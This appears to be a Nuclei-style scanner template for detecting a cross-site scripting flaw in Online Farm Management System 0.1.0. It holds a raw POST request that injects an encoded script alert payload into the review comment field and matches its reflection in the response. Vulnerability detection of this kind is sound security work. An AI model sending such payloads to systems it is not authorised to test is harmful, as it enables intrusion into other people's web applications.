id: onlinefarm-management-xss
info:
  author: arafatansari
  description: 'Online Farm Management System is affected by Cross-Site Scripting
    on the review.php file.

    '
  metadata:
    verified: true
  name: Online Farm Management System 0.1.0 - Cross-Site Scripting
  reference:
  - https://www.exploit-db.com/exploits/48673
  severity: medium
  tags: onlinefarm,cms,xss
requests:
- matchers:
  - part: body
    type: word
    words:
    - '<em style="color: black;"><script>alert(document.domain)</script>'
  - part: header
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  max-redirects: 2
  raw:
  - 'POST /reviewInput.php?pid=1 HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded


    comment=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&rating=0

    '
  redirects: true
